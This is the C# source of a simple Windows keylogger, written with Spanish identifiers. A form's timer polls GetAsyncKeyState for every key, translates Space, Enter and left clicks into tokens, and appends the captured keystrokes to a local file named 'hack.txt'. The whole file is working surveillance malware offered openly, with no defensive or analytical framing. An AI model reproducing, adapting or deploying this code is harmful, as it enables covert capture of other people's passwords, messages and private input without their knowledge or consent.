using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Configuration;
using System.Runtime.InteropServices;
using System.IO;

namespace Keylogger
{
    public partial class frmService : Form
    {
        #region DeclaracionVariables
        private System.Windows.Forms.Timer timer;
        [DllImport("User32.dll")] private static extern short GetAsyncKeyState(int vKey);

        string texto = "";
        #endregion

        #region MetodosPrivados
        private void inicioServicio(object sender, EventArgs e)
        {
            try
            {
                timer = new System.Windows.Forms.Timer();
                timer.Interval = Convert.ToInt32(ConfigurationManager.AppSettings["intervaloEjecucion"]);
                timer.Enabled = true;
                this.timer.Tick += new EventHandler(EventoTemporizador);
            }
            catch(Exception ex) { 
            
            }
            
        }

        private void EventoTemporizador(object sender, EventArgs e)
        {
            string buffer = "";

            string temp = "";

            foreach (System.Int32 i in Enum.GetValues(typeof(Keys)))
            {
                if (GetAsyncKeyState(i) == -32767)
                {
                    //  buffer = "";
                    temp = Enum.GetName(typeof(Keys), i);




                    switch (Enum.GetName(typeof(Keys), i))
                    {
                        case "Space":
                            buffer += " ";
                            break;
                        case "Enter":
                            //buffer += "\r\n";
                            buffer += "[<|]";
                            break;
                        case "LButton":
                            //Click Derecho
                            buffer += "[CI]";
                            break;

                        default:
                            buffer += Enum.GetName(typeof(Keys), i);
                            break;
                    }




                }

            }

            texto += buffer;

            if (texto.Length > 10)
            {
                archivo(texto);
                texto = "";
            }


        }

        private void archivo(string txt)
        {

            StreamWriter stream = new StreamWriter("hack.txt", true);

            stream.Write(txt);

            stream.Close();


        }

        #endregion
        public frmService()
        {
            InitializeComponent();
        }


        private void detenerServicio(object sender, EventArgs e)
        {
            timer.Enabled = false;
            timer.Stop();
        }

        private void frmService_Load(object sender, EventArgs e)
        {

        }
    }
}
